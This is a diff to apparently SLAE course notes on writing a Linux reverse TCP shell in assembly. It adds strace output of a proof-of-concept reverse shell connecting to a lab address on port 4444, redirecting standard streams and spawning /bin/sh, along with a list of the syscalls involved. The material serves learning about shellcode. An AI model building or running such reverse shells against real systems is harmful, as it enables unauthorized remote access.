@@ -90,12 +90,23 @@ uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sud
 #### Reverse TCP Shell in Assembly
 --------------
 
+Strace is used to debug and monitor the interactions between the executable process and the Linux kernel, visually showing the system calls for the Reverse TCP shell:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,connect,dup2,execve ./reverse_shell_tcp_poc 
+execve("./reverse_shell_tcp_poc", ["./reverse_shell_tcp_poc"], [/* 21 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.0.143")}, 16) = 0
+dup2(3, 0)                              = 0
+dup2(3, 1)                              = 1
+dup2(3, 2)                              = 2
+execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
+```
+
 Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:
 
 * socket -> Creates a socket
-* bind -> Binds the socket to a port
-* listen -> Configures the socket to listen for incoming connections
-* accept -> Accepts connections on the created socket
+* connect -> Initiates a connection on a socket
 * dup2 -> Redirects STDIN, STDOUT, and STDERR to the incoming client connection
 * execve -> Executes a shell
 
